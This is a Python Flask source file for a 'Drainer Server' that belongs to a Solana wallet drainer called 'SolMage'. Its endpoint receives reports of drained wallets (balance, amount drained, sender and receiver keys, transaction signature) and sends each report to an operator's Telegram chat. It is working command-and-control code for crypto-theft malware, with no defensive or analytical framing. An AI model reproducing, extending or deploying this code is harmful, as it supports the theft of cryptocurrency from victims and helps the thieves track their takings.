import requests

from flask import Flask, jsonify, request
from flask_cors import CORS

from json import loads
from os.path import exists as fileExists

from argparse import ArgumentParser

parser = ArgumentParser(
    prog = 'Drainer Server',
    description = 'Server That Receives Information From The Drainer'
)
parser.add_argument('-c', '--config', help = 'Path To Configuration File')
parser.add_argument('-t', '--telegram', help = 'Path To Telegram Configuration File')

args = parser.parse_args()

if not fileExists(args.config):
    print('Server configuration file does not exist.')
    exit(0)

if not fileExists(args.telegram):
    print('Telegram configuration file does not exist.')
    exit(0)

config = loads(open(args.config, 'r').read())
teleConfig = loads(open(args.telegram, 'r').read())

botToken = teleConfig['botToken']
chatId = teleConfig['chatId']
url = 'https://api.telegram.org/bot{}/sendMessage'.format(botToken)

def sendToTelegram(data):

    balance = data['balance']
    drained = data['drained']
    senderPubKey = data['senderPubKey']
    receiverPubKey = data['receiverPubKey']
    signature = data['signature']

    message = f'🎩 SolMage - Report 🎩\nBalance: {balance} Lamports (**{(balance / 10**9)}** SOL)\nDrained: {drained} Lamports (**{(drained / 10**9)}** SOL)\nSender: {senderPubKey}\n\nReceiver: {receiverPubKey}\n\nTransaction ID: ```{signature}```\n\nView Transaction: https://explorer.solana.com/tx/{signature}'
    req = requests.get(url, params = { 'chat_id': chatId, 'text': message })

    return (req.status_code == 200) 

app = Flask(__name__)
CORS(app)

@app.route('/')
def main():
    return jsonify({ 'Up': True })

@app.route(config['endpoint'], methods = ['POST'])
def sendData():
    if request.method == 'POST':
        reqData = request.json
        sentLog = sendToTelegram(reqData)

        if (sentLog):
            print('Sent log successfully.')
            
        else:
            print('Failed to send log.')
        
        return jsonify({'success': sentLog})


app.run(host = config['host'], port = config['port'], debug = True)